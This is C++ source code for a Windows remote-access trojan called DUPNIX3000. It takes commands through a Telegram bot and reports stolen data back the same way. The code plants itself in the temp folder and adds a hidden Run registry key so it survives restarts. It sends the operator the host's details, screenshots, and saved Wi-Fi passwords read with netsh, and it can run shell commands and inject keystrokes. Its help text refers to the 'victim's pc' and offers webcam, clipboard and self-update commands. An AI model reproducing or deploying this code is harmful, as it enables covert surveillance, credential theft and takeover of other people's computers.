#include <iostream>
#include <string>
#include <fstream>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <vector>
#include <atlimage.h>
#include <winternl.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <iomanip>
#include <windows.h>
#include <filesystem>
#include <thread>
#include <opencv2/opencv.hpp> 
#include <nlohmann/json.hpp>
#include <cpr/cpr.h>

#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")


using namespace std;
using json = nlohmann::json;
using namespace cv;

string ID;
const string BOT_API = ""; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
const string CHAT_ID = "-1001655582641";
const string VERSION = "beta v0.2.9";
constexpr int TELEGRAM_MAX = 4096;


inline bool filexits(const string& name) {
    struct stat buffer;
    return (stat(name.c_str(), &buffer) == 0);
}
string uptime(); string get_exe(); string hostname(); string public_ip(); string admin_rights(); string Cursor_Position();
const vector <pair<string, string(*)()>> constants = { {"$UPTIME$",uptime},{"$EXE_NAME$",get_exe},{"$HOST_NAME$",hostname},{"$PUBLIC_IP$",public_ip},{"$ADIMN_RIGHTS$",admin_rights},{"$CURSOR_POSITION$",Cursor_Position}};
void Send(string);

json bad_json() {
    json jd;
    jd["message_id"] = 69;
    jd["date"] = -1;
    return jd;
}

json GetLastMessage(){

    auto response = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + BOT_API + "/getUpdates?last=1&offset=-1"});
    string s = response.text;
    if(!s.empty())  s = s.substr(21, s.size() - 23);
    if(s.empty() || s=="\n") {
        return bad_json();
    }
    for (int i = 0; i < constants.size(); i++) {
        int pos = s.find(constants[i].first);
        while (pos != string::npos) {
            string buff = s.substr(0, pos);
            buff += constants[i].second();
            buff += s.substr(pos + constants[i].first.size(), TELEGRAM_MAX);
            s = buff;
            pos = s.find(constants[i].first);
        }
    }
    static bool somethingwentwrong(false);
    json j;
    try {
        j = json::parse(s);
    }
    catch (json::parse_error& e)
    {
            cerr << endl<< endl <<"message: " << e.what() << '\n'
            << "exception id: " << e.id << '\n'
            << "byte position of error: " << e.byte << std::endl;
            if (!somethingwentwrong) Send(ID + " something went wrong with parsing to json");
            somethingwentwrong = true;

            return bad_json();
    }
    somethingwentwrong = false;
    return j["channel_post"];
}

int ChangeVolume(double nVolume=-1, bool bScalar=0)
{
    HRESULT hr = 0;
    bool decibels = false;
    bool scalar = false;
    double newVolume = nVolume;

    auto j = CoInitialize(NULL);
    IMMDeviceEnumerator* deviceEnumerator = NULL;
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
        __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator);
    IMMDevice* defaultDevice = NULL;

    hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
    deviceEnumerator->Release();
    deviceEnumerator = NULL;

    IAudioEndpointVolume* endpointVolume = NULL;
    hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
        CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume);
    defaultDevice->Release();
    defaultDevice = NULL;

    float currentVolume = 0;
    endpointVolume->GetMasterVolumeLevel(&currentVolume);

    hr = endpointVolume->GetMasterVolumeLevelScalar(&currentVolume);
    if (nVolume == -1)newVolume = currentVolume;
    if (bScalar == false)
    {
        hr = endpointVolume->SetMasterVolumeLevel((float)newVolume, NULL);
    }
    else if (bScalar == true)
    {
        hr = endpointVolume->SetMasterVolumeLevelScalar((float)newVolume, NULL);
    }
    endpointVolume->Release();

    CoUninitialize();

    return currentVolume*100;
}

void setID(string newID)
{
    ID = newID;
    fstream file;
    file.open("ID.id", ios::out);
    file << newID;
    file.close();
}

void press(char a, bool bigone = 0)
{
    if (bigone) {
        keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
        Sleep(5);
        keybd_event(VkKeyScan(a), 1, 0, 0);
        Sleep(5);
        keybd_event(VkKeyScan(a), 1, KEYEVENTF_KEYUP, 0);
        keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    }
    else {
        keybd_event(VkKeyScan(a), 1, 0, 0);
        Sleep(5);
        keybd_event(VkKeyScan(a), 1, KEYEVENTF_KEYUP, 0);
    }
}

string get_exe() {
    //https://stackoverflow.com/questions/10814934/how-can-program-get-executable-name-of-itself
    TCHAR buffer[MAX_PATH] = { 0 };
    TCHAR* out;
    DWORD bufSize = sizeof(buffer) / sizeof(*buffer);
    GetModuleFileName(NULL, buffer, bufSize);
    out = PathFindFileName(buffer);
    return out;
}

string get_path() {
    //https://stackoverflow.com/questions/10814934/how-can-program-get-executable-name-of-itself
    TCHAR buffer[MAX_PATH] = { 0 };
    DWORD bufSize = sizeof(buffer) / sizeof(*buffer);
    GetModuleFileName(NULL, buffer, bufSize);
    string buff = buffer;
    return buff.substr(0,buff.size()-get_exe().size());
}

//https://stackoverflow.com/questions/154536/encode-decode-urls-in-c
string url_encode(const string& value) {
    ostringstream escaped;
    escaped.fill('0');
    escaped << hex;

    for (string::const_iterator i = value.begin(), n = value.end(); i != n; ++i) {
        string::value_type c = (*i);

        // Keep alphanumeric and other accepted characters intact
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
            continue;
        }

        // Any other characters are percent-encoded
        escaped << uppercase;
        escaped << '%' << setw(2) << int((unsigned char)c);
        escaped << nouppercase;
    }

    return escaped.str();
}

void Send(string to_send) {
    while (!to_send.empty()) {
        cpr::Response r = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + BOT_API + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + url_encode(to_send.substr(0,4095))});
        to_send.erase(0, 4095);
    }
}

void SendPhoto(string path) {
    //"curl -s -X POST \"https://api.telegram.org/bot" + BOT_API + "/sendPhoto\" -F chat_id=" + CHAT_ID + " -F photo=\"@" + path + "\"";
    cpr::Response r = cpr::Post(cpr::Url{ "https://api.telegram.org/bot" + BOT_API + "/sendPhoto"},
        cpr::Multipart{ {"chat_id", CHAT_ID},
                       {"photo", cpr::File{path}} });
    //cout << r.text;
}

string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

vector<pair<string, string>> LocalIp;
void ListIpAddresses() {
    IP_ADAPTER_ADDRESSES* adapter_addresses(NULL);
    IP_ADAPTER_ADDRESSES* adapter(NULL);

    DWORD adapter_addresses_buffer_size = 16 * 1024;

    // Get adapter addresses
    for (int attempts = 0; attempts != 3; ++attempts) {
        adapter_addresses = (IP_ADAPTER_ADDRESSES*)malloc(adapter_addresses_buffer_size);

        DWORD error = ::GetAdaptersAddresses(AF_UNSPEC,
            GAA_FLAG_SKIP_ANYCAST |
            GAA_FLAG_SKIP_MULTICAST |
            GAA_FLAG_SKIP_DNS_SERVER |
            GAA_FLAG_SKIP_FRIENDLY_NAME,
            NULL,
            adapter_addresses,
            &adapter_addresses_buffer_size);

        if (ERROR_SUCCESS == error) {
            break;
        }
        else if (ERROR_BUFFER_OVERFLOW == error) {
            // Try again with the new size
            free(adapter_addresses);
            adapter_addresses = NULL;
            continue;
        }
        else {
            // Unexpected error code - log and throw
            free(adapter_addresses);
            adapter_addresses = NULL;
            return;
        }
    }

    // Iterate through all of the adapters
    for (adapter = adapter_addresses; NULL != adapter; adapter = adapter->Next) {
        // Skip loopback adapters
        if (IF_TYPE_SOFTWARE_LOOPBACK == adapter->IfType) continue;


        // Parse all IPv4 addresses
        for (IP_ADAPTER_UNICAST_ADDRESS* address = adapter->FirstUnicastAddress; NULL != address; address = address->Next) {
            auto family = address->Address.lpSockaddr->sa_family;
            if (AF_INET == family) {
                SOCKADDR_IN* ipv4 = reinterpret_cast<SOCKADDR_IN*>(address->Address.lpSockaddr);
                char str_buffer[16] = { 0 };
                inet_ntop(AF_INET, &(ipv4->sin_addr), str_buffer, 16);

                wstring shit(adapter->FriendlyName);
                string normal(shit.begin(),shit.end());

                if (normal == "Ethernet" || normal == "Wi-Fi") {;
                    LocalIp.push_back({normal,str_buffer});
                } 
            }
        }
    }

    free(adapter_addresses);
    adapter_addresses = NULL;
}

BOOL IsProcessElevated()
{
    BOOL fIsElevated = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        printf("\n Failed to get Process Token :%d.", GetLastError());
        goto Cleanup;  // if Failed, we treat as False
    }


    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
    {
        printf("\nFailed to get Token Information :%d.", GetLastError());
        goto Cleanup;// if Failed, we treat as False
    }

    fIsElevated = elevation.TokenIsElevated;

Cleanup:
    if (hToken)
    {
        CloseHandle(hToken);
        hToken = NULL;
    }
    return fIsElevated;
}

string uptime() {
    int uptime_h = ((double)clock()) / CLOCKS_PER_SEC / 3600;
    int uptime_m = ((double)clock()) / CLOCKS_PER_SEC / 60;
    uptime_m -= uptime_h * 60;
    if (uptime_m < 0)uptime_m = 0;
    return to_string(uptime_h) + "h" + to_string(uptime_m) + "m";
}

string hostname() {
    string buffer = exec("hostname");
    buffer[buffer.size() - 1] = ' ';
    return buffer;
}

string public_ip() {
    auto response = cpr::Get(cpr::Url{ "https://myexternalip.com/raw" });
    return response.text;
}

string admin_rights() {
    return to_string(IsProcessElevated());
}

string Cursor_Position() {
    POINT p;
    GetCursorPos(&p);
    return to_string(p.x) + "," + to_string(p.y);
}

string DiskList() {
    string s = exec("wmic logicaldisk get caption");
    string output = "";
    for (int i = 7; i < s.size(); i++) {
        if (s[i] >= 65 && s[i] <= 90) {
            output += s[i];
            output += ", ";
        }
    }
    return output.substr(0,output.size()-2);
}

string getStatus() {
    string status;

    status  = "uptime: " + uptime() + '\n';
    status += "exe_name: " + get_exe() + '\n';
    status += "host_name: " + hostname() + '\n';
    status += "public_ip: " + public_ip() +'\n';
    status += "local_ip: \n";

    LocalIp.clear();  ListIpAddresses();
    for (auto i : LocalIp) {
        status += "  " + i.first + ": " + i.second + "\n";
    }
    status += "admin_rights: " + admin_rights() + '\n';
    status += "exe_path: " + get_path() + '\n';
    status += "current_volume: " + to_string(ChangeVolume()) + '\n';
    status += "cursor_position: " + Cursor_Position() + '\n';
    status += "list_of_disks: " + DiskList() + '\n';

    status += "\nversion: " + VERSION + '\n';
    return status;
}

string random_string(int lenght) {
    srand(time(0));
    string random = "";
    while (lenght--) {
        char ran = rand() % 25 + 97;
        random += ran;
    }
    return random;
}

void autostart() {
    string path;
    char username[256 + 1];
    DWORD username_len = 256 + 1;
    GetUserName(username, &username_len);

    char letter[256 + 1];
    GetSystemDirectory(letter, sizeof(letter));

    path = letter[0];
    path += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp";
    if (!filexits(path + "\\" + get_exe())) {
        Send("New user\nUsername: " + hostname() + "\nip: " + public_ip());

        fstream file;
        file.open("o.bat", ios::out);
        file << "TASKKILL /F /IM " << get_exe() << endl
            << "move " << get_exe() << " %temp%" << endl
            << "move " << "shitoo" << " %temp%" << endl
            << "start %temp%\\" + get_exe() <<endl
            << "exit";
        file.close();

        //if there's already no key for autosrat then it adds one
        string s = "reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f " + get_exe();
        if (exec(s.c_str()).find("End of search: 0 match(es) found.") != string::npos) {
            cout << "Adding new key for autostart\n";
            string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + random_string(16) + " /t REG_SZ /d %temp%\\" + get_exe();
            system(cmd.c_str());
        }

        char buffer[MAX_PATH];
        ::GetModuleFileNameA(NULL, buffer, MAX_PATH);
        string buff2(buffer);
        buff2.erase(buff2.size() - get_exe().size(), 256);
        file.open("shitoo", ios::out);
        file << buff2 + "o.bat";
        file.close();
        system("start /min o.bat");
    }
    if (filexits(path + "\\shitoo")) {
        fstream file;
        string path2;
        file.open(path + "\\shitoo", ios::in);
        file >> path2;
        file.close();
        
        string cmd = "del " + path2;
        system("del %temp%\\shitoo");
        system(cmd.c_str());
    }
}

void hotkeys(string hotkey) {
    string buff;
    //pressing keys
    for (int i = 0; i < hotkey.size(); i++) {
        if (hotkey[i] == '+') {
            //it looks like a shit but idk other way
            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122) keybd_event(VkKeyScan(buff[0]), 1, 0, 0);
            else if (buff == "esc") { keybd_event(VK_ESCAPE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "tab") { keybd_event(VK_TAB, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "capslock") { keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "shift") { keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "ctrl") { keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "win") { keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "alt") { keybd_event(VK_MENU, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "ralt") { keybd_event(VK_RMENU, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "space") { keybd_event(VK_SPACE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "enter") { keybd_event(VK_RETURN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "backspace") { keybd_event(VK_BACK, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "del") { keybd_event(VK_DELETE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f1") { keybd_event(VK_F1, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f2") { keybd_event(VK_F2, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f3") { keybd_event(VK_F3, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f4") { keybd_event(VK_F4, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f5") { keybd_event(VK_F5, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f6") { keybd_event(VK_F6, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f7") { keybd_event(VK_F7, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f8") { keybd_event(VK_F8, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f9") { keybd_event(VK_F9, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f10") { keybd_event(VK_F10, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f11") { keybd_event(VK_F11, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f12") { keybd_event(VK_F12, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "ins") { keybd_event(VK_INSERT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "home") { keybd_event(VK_HOME, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "end") { keybd_event(VK_END, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "pgdn") { keybd_event(VK_NEXT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "pgup") { keybd_event(VK_PRIOR, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "uparrow") { keybd_event(VK_UP, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "downarrow") { keybd_event(VK_DOWN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "leftarrow") { keybd_event(VK_LEFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "rightarrow") { keybd_event(VK_RIGHT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "lmouse") { keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }

            buff.clear();
        }
        else buff += hotkey[i];
    }
    //unpressing keys
    buff.clear();
    for (int i = 0; i < hotkey.size(); i++) {
        if (hotkey[i] == '+') {
            //it looks like a shit but idk other way
            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122) keybd_event(VkKeyScan(buff[0]), 1, KEYEVENTF_KEYUP, 0);
            else if (buff == "esc") { keybd_event(VK_ESCAPE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "tab") { keybd_event(VK_TAB, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "capslock") { keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "shift") { keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "ctrl") { keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "win") { keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "alt") { keybd_event(VK_MENU, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "ralt") { keybd_event(VK_RMENU, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "space") { keybd_event(VK_SPACE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "enter") { keybd_event(VK_RETURN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "backspace") { keybd_event(VK_BACK, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "del") { keybd_event(VK_DELETE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f1") { keybd_event(VK_F1, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f2") { keybd_event(VK_F2, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f3") { keybd_event(VK_F3, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f4") { keybd_event(VK_F4, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f5") { keybd_event(VK_F5, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f6") { keybd_event(VK_F6, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f7") { keybd_event(VK_F7, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f8") { keybd_event(VK_F8, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f9") { keybd_event(VK_F9, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f10") { keybd_event(VK_F10, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f11") { keybd_event(VK_F11, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f12") { keybd_event(VK_F12, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "ins") { keybd_event(VK_INSERT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "home") { keybd_event(VK_HOME, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "end") { keybd_event(VK_END, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "pgdn") { keybd_event(VK_NEXT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "pgup") { keybd_event(VK_PRIOR, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "uparrow") { keybd_event(VK_UP, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "downarrow") { keybd_event(VK_DOWN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "leftarrow") { keybd_event(VK_LEFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "rightarrow") { keybd_event(VK_RIGHT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "leftbutton") { keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }

            buff.clear();
        }
        else buff += hotkey[i];
    }
}

void logo() {
    cout << "     _                   _      _____  ___   ___   ___" << endl
        << "  __| |_   _ _ __  _ __ (_)_  _|___ / / _ \\ / _ \\ / _ \\" << endl
        << " / _` | | | | '_ \\| '_ \\| \\ \\/ / |_ \\| | | | | | | | | |" << endl
        << "| (_| | |_| | |_) | | | | |>  < ___) | |_| | |_| | |_| |" << endl
        << " \\__,_|\\__,_| .__/|_| |_|_/_/\\_\\____/ \\___/ \\___/ \\___/" << endl
        << "            |_|         " + VERSION << endl;
}      

double time_lenght (time_t start, time_t stop) {
    return (double)(stop - start) / CLOCKS_PER_SEC;
}

void Remove(string path) {
    string s = "del " + path;
    system(s.c_str());
}

void startup() {
    logo();
    fstream file;
    file.open("ID.id");
    file >> ID;
    file.close();

    if (ID.empty()) ID = "X";

    Send(ID + " is running");
    cout << "ID: " + ID << endl;

    string s = get_path() + "update.bat";
    if (filexits(s))Remove(s);

}

void help(string parameters) {
    if (parameters == "NULL") {
        string help = "<ID> <command> <parameters>, you can use && when you want 2 commands in one message, e.g 420 SetCursor 1920,0 && Hotkey lmouse\n\n";
        help += "Type <ID> help <command> for more specific info\nAll available commands: \n";
        help += "Status\n";
        help += "cmd <command>\n";
        help += "SetCursor <X,Y>\n";
        help += "BlockCursor <seconds>\n";
        help += "Volume <0-100>, +<0-100>, -<0-100>, empty\n";
        help += "BlockClipboard <true/fase> \n";
        help += "SetID <ID>\n";
        help += "Press <text>\n";
        help += "SendClipboard\n";
        help += "Screenshot\n";
        help += "msgbox <\"Text\",number,\"Title\">\n";
        help += "Hotkey <hotkey>\n";
        help += "Taskkill <proccess name+.exe>\n";
        help += "ProcessList\n";
        help += "IsFileExits <path to file>\n";
        help += "WebcamView\n";
        help += "Sleep <seconds>\n";
        help += "ErrorSound\n";
        help += "RunningApps\n";
        help += "ALL_ID (without <id>)\n";
        help += "ListOfFiles <path>\n";
        help += "WifiList\n";
        help += "CloseForeground <true/false>\n";
        help += "WriteToClipboard <text>\n";

        help += "Delitself\n";
        help += "Update <link to new version>\n";
        help += "help\n";

        Send(help);
    }
    else {
        if (parameters == "status") Send("It sends some info, uptime is uptime of dupnix, not pc");
        else if (parameters == "cmd") Send("It works like a ssh");
        else if (parameters == "SetCursor") Send("It sets cursor to X,Y position");
        else if (parameters == "BlockCursor") Send("It blocks cursor at 0,0 for x seconds");
        else if (parameters == "BlockClipboard") Send("Makes your victim's clipboard non usable");
        else if (parameters == "Volume") Send("Sets volume in your victim's pc, you can increase/decrase using +/-, set it by number or just see actual volume");
        else if (parameters == "SetID") Send("changes ID, defaultly it's X but you should change it to 420,69 etc");
        else if (parameters == "Press") Send("Makes your victim's pc is writing your stuff e.g polish proverb \"Jebac Disa!\"");
        else if (parameters == "SendCliboard") Send("Sends your victim's clipboard");
        else if (parameters == "Screenshot") Send("Makes a screenshot, uploading it to 0x0.st and giving you link");
        else if (parameters == "msgbox") Send("Makes a msgbox, you have to write it with \"s and ,s \navailable numbers: https://www.instructables.com/How-to-Make-a-message-box-using-VBScript/");
        else if (parameters == "help") Send("Yes i did help for help, here's tutorial what it does: https://www.youtube.com/watch?v=dQw4w9WgXcQ");
        else if (parameters == "Hotkey") Send("usage is ctrl, ctrl+a, shift+alt+del+ins+a, etc. all keys: \nesc\ntab\ncapslock\nshift\nctrl\nwin\nalt\nralt\nspace\nenter\nbackspace\ndel\nf1\nf..12\nins\nhome\nend\npgdn\npgup\nuparrow\ndownarrow\nleftarrow\nrightarrow\nlmouse"); //It's so fucking big step bro
        else if (parameters == "Delitself") Send("Deleting DUPNIX3000 from victim's pc");
        else if (parameters == "Update") Send("Updating to newer version without access to victim's pc ");
        else if (parameters == "Taskkill") Send("Kills a process");
        else if (parameters == "ProcessList") Send("Sends you a list of all processes actually running");
        else if (parameters == "IsFileExits") Send("Says if a file exits");
        else if (parameters == "WebcamView") Send("Sends you webcam, if there's grey square it can means that something is wrong with webcam");
        else if (parameters == "Sleep") Send("makes dupnix sleeping, commands are not working, may be useful e.g for \"Sleep 3600 && cmd shutdown /s\" when you want to shutdown pc in an hour");
        else if (parameters == "ErrorSound") Send("Just makes windows error sound");
        else if (parameters == "RunningApps")Send("List of running first-plan apps");
        else if (parameters == "ALL_ID")Send("Every victim will send their id");
        else if (parameters == "ListOfFiles") Send("Lists all files and folders in given path");
        else if (parameters == "WifiList") Send("Gives you a list of Wifi names and passwords for them");
        else if (parameters == "CloseForeground") Send("Nice troll to close every active window");
        else if (parameters == "WriteToClipboard") Send("Write sth to clipboard");
        else Send("Wrong command.");
    }
}

BITMAPINFOHEADER createBitmapHeader(int width, int height)
{
    BITMAPINFOHEADER  bi;

    // create a bitmap
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;  //this is the line that makes it draw upside down or not
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    return bi;
}

Mat captureScreenMat(HWND hwnd)
{
    Mat src;

    // get handles to a device context (DC)
    HDC hwindowDC = GetDC(hwnd);
    HDC hwindowCompatibleDC = CreateCompatibleDC(hwindowDC);
    SetStretchBltMode(hwindowCompatibleDC, COLORONCOLOR);

    // define scale, height and width
    int screenx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int screeny = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    // create mat object
    src.create(height, width, CV_8UC4);

    // create a bitmap
    HBITMAP hbwindow = CreateCompatibleBitmap(hwindowDC, width, height);
    BITMAPINFOHEADER bi = createBitmapHeader(width, height);

    // use the previously created device context with the bitmap
    SelectObject(hwindowCompatibleDC, hbwindow);

    // copy from the window device context to the bitmap device context
    StretchBlt(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, screenx, screeny, width, height, SRCCOPY);  //change SRCCOPY to NOTSRCCOPY for wacky colors !
    GetDIBits(hwindowCompatibleDC, hbwindow, 0, height, src.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);            //copy from hwindowCompatibleDC to hbwindow

    // avoid memory leak
    DeleteObject(hbwindow);
    DeleteDC(hwindowCompatibleDC);
    ReleaseDC(hwnd, hwindowDC);

    return src;
}

bool is_path(const string& path) {
    struct stat s;
    if (stat(path.c_str(), &s) == 0){
        if (s.st_mode & S_IFDIR) return true; 
        else return false;
    }
    else return false;
}

string ListOfFiles(string path) {
    string output("");
    if (!is_path(path))return "Path not exists or it's a file";

    for (const auto& file : std::filesystem::directory_iterator(path)) {
        output += file.path().generic_string().substr(path.size() + (path[path.size() - 1] == '/' || path[path.size() - 1] == '\\' ? 0 : 1), 256);
        if (file.is_directory())output += "/";
        output += '\n';
    }
    return output;
}

string get_ListOfWifiPasswords() {
    vector<string> wifi;

    string parse(exec("netsh wlan show profile"));
    int pos = parse.find("All User Profile");

    while(pos!=string::npos){
        string wifi_name = "";
        int pos2 = pos;
        pos = parse.find("All User Profile");

        for (int i = pos2 + 23; i < parse.size(); i++) {
            if (parse[i] == '\n')break;
            wifi_name += parse[i];
        }
        parse.erase(0, pos + 23);
        pos = parse.find("All User Profile");
        wifi.push_back(wifi_name);
    }
    string output = "";
    for (auto& i : wifi) {
        output += i + " : ";
        string s = "netsh wlan show profile " + i + " key=clear";
        s = exec(s.c_str());

        int pos = s.find("Key Content");
        if (pos != string::npos) {
            for (int i = pos + 25; i < s.size(); i++) {
                if (s[i] == '\n')break;
                output += s[i];
            }
        }
        output += '\n';
    }
    return output;
}

bool ClosingForeground = false;

void CloseForeground() {
    HWND Wind;
